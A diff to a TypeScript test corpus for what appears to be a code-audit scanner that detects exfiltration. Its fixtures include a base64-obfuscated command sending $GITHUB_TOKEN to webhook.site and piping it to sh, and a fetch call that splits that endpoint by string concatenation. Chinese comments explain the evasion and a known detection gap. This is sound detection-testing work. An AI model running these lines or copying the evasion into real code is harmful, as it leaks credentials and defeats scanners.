@@ -53,6 +53,18 @@ const corpus: CorpusCase[] = [
     content: 'echo Y3VybCBodHRwczovL3dlYmhvb2suc2l0ZS9hYmMgLWQgIiRHSVRIVUJfVE9LRU4i | base64 -d | sh\n',
   },
   {
+    // Wave-H:单行内字符串字面量拼接把 endpoint 域名拆开(webhook. + site)躲关键词匹配;
+    // 折叠后 exfil-endpoint 看见连续 webhook.site → 命中。良性 API 拼接(api.example.com)
+    // 折叠后不含外发动作 + 已知端点,零误报。
+    id: 'javascript-string-concat-endpoint-inline',
+    expected: 'hit',
+    content: "fetch('https://webhook.' + 'site/abc');\n",
+  },
+  {
+    // 跨行 + 拼接的组合:endpoint 在第 1 行拼接后赋给变量,fetch 在第 2 行用变量。
+    // 单行折叠让第 1 行 endpoint 现形,但那一行无外发动作;fetch 那行的 URL 是变量、
+    // 无字面 endpoint。单行折叠与既有单行规则都碰不到——仍是已知边界(需跨行常量传播 +
+    // 数据流分析),见 docs/known-limitations.md。
     id: 'javascript-string-concat-endpoint',
     expected: 'miss',
     content:
@@ -316,6 +328,8 @@ describe('A5 audit recall corpus', () => {
       'same-line-sensitive-file-exfil',
       'credential-phishing-lure',
       'base64-encoded-payload',
+      // Wave-H:单行内拼接拆开的 endpoint 经折叠现形 → 命中
+      'javascript-string-concat-endpoint-inline',
       'unicode-homoglyph-command-and-endpoint',
       // A3/taint: miss→hit(跨行 token source→fetch POST sink 关联);corpus 顺序在此
       'cross-line-token-and-endpoint-split',
